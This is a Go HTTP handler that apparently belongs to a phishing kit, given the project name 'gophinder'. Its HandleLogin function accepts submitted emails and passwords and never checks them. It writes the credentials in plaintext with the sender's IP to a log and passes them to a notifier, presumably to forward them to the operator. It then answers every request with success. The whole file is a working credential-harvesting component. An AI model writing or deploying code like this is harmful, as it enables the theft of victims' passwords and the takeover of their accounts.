package handler

import (
	"encoding/json"
	"log"
	"net/http"

	"gophinder/internal/logging"
	"gophinder/internal/notifier"
	"gophinder/utils"
)

type LoginData struct {
	Email    string `json:"email"`
	Password string `json:"password"`
}

func HandleLogin(notifier notifier.Notifier) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		var data LoginData
		if err := json.NewDecoder(r.Body).Decode(&data); err != nil {
			log.Printf("Login decode error: %v", err)
			http.Error(w, "Invalid payload", http.StatusBadRequest)
			return
		}

		ip := utils.GetIP(r)
		fields := map[string]string{
			"IP Address": ip,
			"Email":      data.Email,
			"Password":   data.Password,
		}
		logging.LogBlock("Login Attempt", fields)

		if notifier != nil {
			go notifier.Notify("Login Attempt", fields)
		}
		w.WriteHeader(http.StatusOK)
	}
}
